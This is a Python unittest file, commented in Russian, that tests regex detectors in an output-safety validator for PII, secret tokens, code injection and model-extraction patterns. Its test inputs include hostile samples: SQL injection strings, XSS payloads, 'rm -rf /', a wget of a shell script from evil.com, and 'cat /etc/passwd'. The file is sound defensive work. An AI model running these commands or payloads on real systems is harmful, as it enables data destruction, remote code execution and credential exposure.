# -*- coding: utf-8 -*-
"""
Unit-тесты для regex-паттернов системы безопасности
"""

import unittest
import asyncio
from fast_parallel_validator import FastRegexChecker, FastParallelSafetyValidator


class TestPIIPatterns(unittest.TestCase):
    """Тесты для PII паттернов"""

    def setUp(self):
        self.checker = FastRegexChecker()

    def test_email_detection(self):
        """Тест определения email адресов"""
        test_cases = [
            ("user@example.com", True),
            ("test.email@gmail.com", True),
            ("admin@компания.рф", True),  # Кириллический домен
            ("invalid.email", False),
            ("test@", False),
            ("@example.com", False),
        ]

        for text, should_detect in test_cases:
            with self.subTest(text=text):
                detected, violations, sanitized = self.checker.check_pii(text)
                if should_detect:
                    self.assertTrue(detected, f"Должен обнаружить email в: {text}")
                    self.assertIn("email", str(violations))
                else:
                    self.assertFalse(
                        any("email" in str(v) for v in violations),
                        f"Не должен обнаружить email в: {text}",
                    )

    def test_russian_mobile_phones(self):
        """Тест российских мобильных номеров"""
        test_cases = [
            ("+7-999-123-45-67", True),
            ("8 (999) 123-45-67", True),
            ("7-999-123-45-67", True),
            ("+7 999 123 45 67", True),
            ("89991234567", True),
            ("8-800-555-35-35", False),  # Не мобильный
            ("123-456-7890", False),  # Не российский формат
        ]

        for phone, should_detect in test_cases:
            with self.subTest(phone=phone):
                detected, violations, sanitized = self.checker.check_pii(phone)
                if should_detect:
                    self.assertTrue(detected, f"Должен обнаружить мобильный в: {phone}")
                    self.assertTrue(
                        any("phone_ru_mobile" in str(v) for v in violations)
                    )
                else:
                    self.assertFalse(
                        any("phone_ru_mobile" in str(v) for v in violations),
                        f"Не должен обнаружить мобильный в: {phone}",
                    )

    def test_credit_cards(self):
        """Тест банковских карт"""
        test_cases = [
            ("4111-1111-1111-1111", True),  # Visa
            ("5555-5555-5555-4444", True),  # MasterCard
            ("2204-1111-1111-1111", True),  # МИР
            ("1234-5678-9012-3456", True),  # Generic
            ("1234-5678-9012", False),  # Слишком короткий
            ("abcd-efgh-ijkl-mnop", False),  # Не цифры
        ]

        for card, should_detect in test_cases:
            with self.subTest(card=card):
                detected, violations, sanitized = self.checker.check_pii(card)
                if should_detect:
                    self.assertTrue(detected, f"Должен обнаружить карту в: {card}")
                    self.assertTrue(any("credit_card" in str(v) for v in violations))

    def test_russian_documents(self):
        """Тест российских документов"""
        test_cases = [
            ("123-456-789-12", True),  # СНИЛС
            ("1234567890", True),  # ИНН юрлица (10 цифр)
            ("123456789012", True),  # ИНН физлица (12 цифр)
            ("1234 567890", True),  # Паспорт РФ
            ("12 34 567890", True),  # Водительские права
        ]

        for doc, should_detect in test_cases:
            with self.subTest(doc=doc):
                detected, violations, sanitized = self.checker.check_pii(doc)
                self.assertTrue(detected, f"Должен обнаружить документ в: {doc}")


class TestSensitivePatterns(unittest.TestCase):
    """Тесты для паттернов чувствительных данных"""

    def setUp(self):
        self.checker = FastRegexChecker()

    def test_api_keys(self):
        """Тест API ключей"""
        test_cases = [
            ("api_key: sk-1234567890abcdef", True),
            ("token=ghp_abcd1234567890123456789012345678", True),
            ("Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", True),  # JWT
            ("secret: mysecretpassword123", True),
            ("password=admin123456", True),
        ]

        for text, should_detect in test_cases:
            with self.subTest(text=text):
                detected, violations, sanitized = self.checker.check_sensitive(text)
                if should_detect:
                    self.assertTrue(detected, f"Должен обнаружить API ключ в: {text}")

    def test_russian_services(self):
        """Тест российских сервисов"""
        test_cases = [
            ("AQVN1234567890abcdef1234567890abcdef12", True),  # Yandex
            ("1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ123456789", True),  # Telegram bot
        ]

        for text, should_detect in test_cases:
            with self.subTest(text=text):
                detected, violations, sanitized = self.checker.check_sensitive(text)
                if should_detect:
                    self.assertTrue(
                        detected,
                        f"Должен обнаружить токен российского сервиса в: {text}",
                    )

    def test_medical_data(self):
        """Тест медицинских данных"""
        medical_terms_ru = [
            "пациент болеет диабетом",
            "врач назначил лечение",
            "результат анализа крови",
            "диагноз: гипертония",
        ]

        medical_terms_en = [
            "patient has diabetes",
            "doctor prescribed treatment",
            "medical test results",
            "diagnosis: hypertension",
        ]

        for text in medical_terms_ru + medical_terms_en:
            with self.subTest(text=text):
                detected, violations, sanitized = self.checker.check_sensitive(text)
                self.assertTrue(
                    detected, f"Должен обнаружить медицинские данные в: {text}"
                )


class TestCodeInjectionPatterns(unittest.TestCase):
    """Тесты для паттернов инъекций кода"""

    def setUp(self):
        self.checker = FastRegexChecker()

    def test_sql_injection(self):
        """Тест SQL инъекций"""
        test_cases = [
            ("SELECT * FROM users", True),
            ("INSERT INTO table VALUES", True),
            ("' OR 1=1 --", True),
            ("UNION SELECT password FROM users", True),
            ("'; DROP TABLE users; --", True),
            ("обычный текст без SQL", False),
        ]

        for text, should_detect in test_cases:
            with self.subTest(text=text):
                detected, violations = self.checker.check_code(text)
                if should_detect:
                    self.assertTrue(
                        detected, f"Должен обнаружить SQL инъекцию в: {text}"
                    )
                    self.assertTrue(any("sql" in str(v).lower() for v in violations))

    def test_javascript_injection(self):
        """Тест JavaScript инъекций"""
        test_cases = [
            ("<script>alert('xss')</script>", True),
            ("javascript:alert(1)", True),
            ("eval(userInput)", True),
            ("document.cookie", True),
            ("onclick=alert(1)", True),
            ("обычный текст", False),
        ]

        for text, should_detect in test_cases:
            with self.subTest(text=text):
                detected, violations = self.checker.check_code(text)
                if should_detect:
                    self.assertTrue(
                        detected, f"Должен обнаружить JavaScript инъекцию в: {text}"
                    )

    def test_command_injection(self):
        """Тест command injection"""
        test_cases = [
            ("rm -rf /", True),
            ("wget http://evil.com/shell.sh", True),
            ("sudo su", True),
            ("cat /etc/passwd", True),
            ("ls -la", True),
            ("обычная команда", False),
        ]

        for text, should_detect in test_cases:
            with self.subTest(text=text):
                detected, violations = self.checker.check_code(text)
                if should_detect:
                    self.assertTrue(
                        detected, f"Должен обнаружить command injection в: {text}"
                    )

    def test_python_code_execution(self):
        """Тест Python code execution"""
        test_cases = [
            ("exec(user_input)", True),
            ("eval('malicious code')", True),
            ("__import__('os').system('ls')", True),
            ("os.system('rm -rf /')", True),
            ("subprocess.call(['rm', '-rf', '/'])", True),
            ("print('hello world')", False),  # Безопасная функция
        ]

        for text, should_detect in test_cases:
            with self.subTest(text=text):
                detected, violations = self.checker.check_code(text)
                if should_detect:
                    self.assertTrue(
                        detected, f"Должен обнаружить Python code execution в: {text}"
                    )


class TestModelExtractionPatterns(unittest.TestCase):
    """Тесты для паттернов извлечения модели"""

    def setUp(self):
        self.checker = FastRegexChecker()

    def test_pytorch_patterns(self):
        """Тест PyTorch паттернов"""
        test_cases = [
            ("model.state_dict()", True),
            ("torch.save(model, 'file')", True),
            ("model.parameters()", True),
            ("model.load_state_dict(state)", True),
            ("обычный код", False),
        ]

        for text, should_detect in test_cases:
            with self.subTest(text=text):
                detected, violations = self.checker.check_model(text)
                if should_detect:
                    self.assertTrue(
                        detected, f"Должен обнаружить PyTorch паттерн в: {text}"
                    )


class TestIntegratedValidator(unittest.TestCase):
    """Интеграционные тесты валидатора"""

    def setUp(self):
        self.validator = FastParallelSafetyValidator()

    def test_simple_safe_text(self):
        """Тест безопасного текста"""
        safe_text = "Это обычный безопасный текст без чувствительных данных."
        result = self.validator.validate_output(safe_text)

        self.assertTrue(result.is_safe)
        self.assertEqual(len(result.violations), 0)
        self.assertEqual(result.risk_score, 0.0)
        self.assertEqual(result.sanitized_text, safe_text)

    def test_text_with_pii(self):
        """Тест текста с PII данными"""
        text_with_pii = "Мой email: user@example.com, телефон: +7-999-123-45-67"
        result = self.validator.validate_output(text_with_pii)

        self.assertFalse(result.is_safe)
        self.assertGreater(len(result.violations), 0)
        self.assertGreater(result.risk_score, 0.0)
        self.assertIn("СКРЫТО", result.sanitized_text)

    def test_text_with_sql_injection(self):
        """Тест текста с SQL инъекцией"""
        malicious_text = "SELECT * FROM users WHERE password = 'admin' OR '1'='1'"
        result = self.validator.validate_output(malicious_text)

        self.assertFalse(result.is_safe)
        self.assertGreater(len(result.violations), 0)
        self.assertGreater(result.risk_score, 0.8)  # Высокий риск для code injection

    def test_async_validation(self):
        """Тест асинхронной валидации"""

        async def run_async_test():
            text = "Тест асинхронной валидации с email: test@example.com"
            result = await self.validator.validate_output_async(text, "test_user")

            self.assertFalse(result.is_safe)
            self.assertGreater(len(result.violations), 0)
            self.assertEqual(result.details["user_id"], "test_user")

        asyncio.run(run_async_test())

    def test_long_text_segmentation(self):
        """Тест сегментации длинного текста"""
        # Создаем текст длиннее segment_size
        long_text = "Безопасный текст. " * 500  # ~9000 символов
        long_text += "Опасный email: admin@secret.com"

        result = self.validator.validate_output(long_text)

        self.assertFalse(result.is_safe)
        self.assertGreater(len(result.violations), 0)
        self.assertIn("segments_count", result.details)

    def test_risk_calculation(self):
        """Тест вычисления риска"""
        # Текст с multiple нарушениями
        high_risk_text = "SELECT * FROM users; email: admin@test.com; api_key: sk-123456789012345678901234567890"
        result = self.validator.validate_output(high_risk_text)

        self.assertFalse(result.is_safe)
        self.assertGreater(result.risk_score, 0.8)  # Должен быть высокий риск
        self.assertGreater(len(result.violations), 2)  # Несколько нарушений


class TestPerformance(unittest.TestCase):
    """Тесты производительности"""

    def setUp(self):
        self.validator = FastParallelSafetyValidator()

    def test_processing_time(self):
        """Тест времени обработки"""
        text = "Тест производительности с небольшим количеством текста."
        result = self.validator.validate_output(text)

        # Должно быть быстрее 100ms для коротких текстов
        self.assertLess(result.processing_time, 0.1)

    def test_text_size_limits(self):
        """Тест лимитов размера текста"""
        # Тест слишком длинного текста
        huge_text = "x" * 150_000  # Больше max_text_length
        result = self.validator.validate_output(huge_text)

        self.assertFalse(result.is_safe)
        self.assertIn("TEXT_TOO_LONG", result.violations)
        self.assertEqual(result.risk_score, 1.0)


if __name__ == "__main__":
    # Запуск всех тестов
    unittest.main(verbosity=2)
